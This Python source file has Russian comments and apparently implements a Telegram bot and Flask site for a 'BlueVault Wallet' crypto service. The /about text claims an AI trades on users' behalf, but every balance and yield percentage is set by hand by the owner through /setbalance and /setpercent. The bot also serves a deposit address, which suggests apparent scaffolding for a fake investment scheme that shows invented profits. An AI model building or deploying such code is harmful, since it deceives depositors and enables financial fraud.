import asyncio
import logging
import os
import json
from datetime import datetime
from threading import Thread

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from flask import Flask, request, jsonify

# ====================== НАСТРОЙКИ ======================
API_ID = int(os.getenv('API_ID', 8))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
OWNER_ID = int(os.getenv('OWNER_ID', 1663746192))
CRYPTO_ADDRESS = os.getenv('CRYPTO_ADDRESS', '0xYourAddressHere')
DEFAULT_PERCENT = 0

DATA_FILE = 'bluevault_data.json'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== СОХРАНЕНИЕ ДАННЫХ ======================
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data.get('balances', {}), data.get('percent', DEFAULT_PERCENT)
        except Exception as e:
            logger.error(f"Ошибка загрузки данных: {e}")
    return {}, DEFAULT_PERCENT

def save_data(balances, percent):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump({
                'balances': balances,
                'percent': percent,
                'last_updated': datetime.now().isoformat()
            }, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения данных: {e}")

user_balances, current_percent = load_data()

# ====================== TELETHON ======================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

bot = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
app = Flask(__name__)

_handled = set()

def already_handled(event):
    if event.id in _handled:
        return True
    _handled.add(event.id)
    if len(_handled) > 15000:
        _handled.clear()
    return False

# ====================== FLASK ======================
@app.route('/')
def index():
    return HTML_PAGE  # ваш HTML остаётся без изменений

@app.route('/get_balance')
def get_balance():
    user_id = request.args.get('user_id')
    return jsonify({
        'balance': float(user_balances.get(str(user_id), 0)),
        'percent': current_percent
    })

@app.route('/get_address')
def get_address():
    return jsonify({'address': CRYPTO_ADDRESS})

# ====================== ОБРАБОТЧИКИ БОТА ======================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if already_handled(event): return
    user_id = str(event.sender_id)
    user_balances.setdefault(user_id, 0)
    save_data(user_balances, current_percent)

    await event.respond(
        '🛡 **BlueVault Wallet**\n\n'
        'Используйте /about для информации о проекте.',
        buttons=[[Button.url('🚀 Открыть приложение', 'https://t.me/BlueVaultt_bot/bluevallet')]]
    )

@bot.on(events.NewMessage(pattern='/about'))
async def about(event):
    if already_handled(event): return
    await event.respond(
        'ℹ **О проекте BlueVault**\n\n'
        '1. Участник предоставляет интерфейс доступа.\n'
        '2. Система анализирует рынок и проводит операции.\n'
        '3. Положительные изменения — технический эффект работы ИИ.\n\n'
        '**Внимание:** Проект экспериментальный. Действуйте на свой страх и риск.'
    )

@bot.on(events.NewMessage(pattern='/setbalance'))
async def set_balance(event):
    if already_handled(event) or event.sender_id != OWNER_ID: return
    try:
        _, target_id, amount = event.text.split()
        user_balances[str(target_id)] = float(amount)
        save_data(user_balances, current_percent)
        await event.respond(f'✅ Баланс обновлён:\n{target_id} → {amount} USDT')
    except:
        await event.respond('Использование: `/setbalance <user_id> <сумма>`')

@bot.on(events.NewMessage(pattern='/setpercent'))
async def set_percent(event):
    if already_handled(event) or event.sender_id != OWNER_ID: return
    try:
        global current_percent
        current_percent = int(event.text.split()[1])
        save_data(user_balances, current_percent)
        await event.respond(f'✅ Процент установлен: {current_percent}%')
    except:
        await event.respond('Использование: `/setpercent <число>`')

@bot.on(events.NewMessage(pattern='/myid'))
async def myid(event):
    if already_handled(event): return
    await event.respond(f'Ваш ID: `{event.sender_id}`')

# ... остальные обработчики (/verify, /reply, /endverify, /msg) можете оставить как были

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    logger.info("Бот успешно запущен")
    await bot.run_until_disconnected()

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    Thread(target=run_flask, daemon=True).start()
    loop.run_until_complete(main())
